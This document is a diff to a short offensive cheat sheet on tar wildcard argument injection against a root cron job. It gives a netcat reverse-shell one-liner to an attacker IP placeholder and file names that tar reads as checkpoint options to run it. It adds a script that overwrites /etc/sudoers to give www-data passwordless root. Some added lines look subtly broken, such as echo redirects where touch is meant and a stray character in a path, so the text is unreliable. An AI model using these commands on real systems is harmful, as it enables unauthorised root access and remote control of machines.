@@ -1,5 +1,15 @@
-This is a reverse shell for if tar is running as a job and the directories being tar'd are able to be written to.
+## reverse shell for if tar is running as a job and the directories being tar'd are able to be written to.
 
 echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <your ip> 1234 >/tmp/f" > shell.sh
 touch "<dir being tar'd>/--checkpoint-action=exec=sh shell.sh"
 touch "<dir being tar'd>/--checkpoint=1"
+
+
+## Adding user to sudoers file 
+
+
+echo 'echo "www-data ALL=(root) NOPASSWD: ALL" > /etc/sudoers' > privesc.sh
+echo "<dir being tar'd>"  > "--checkpoint-action=exec=sh privesc.sh"
+echo "<dir being tar'd>l"  > --checkpoint=1
+
+Ref: https://medium.com/@int0x33/day-67-tar-cron-2-root-abusing-wildcards-for-tar-argument-injection-in-root-cronjob-nix-c65c59a77f5e
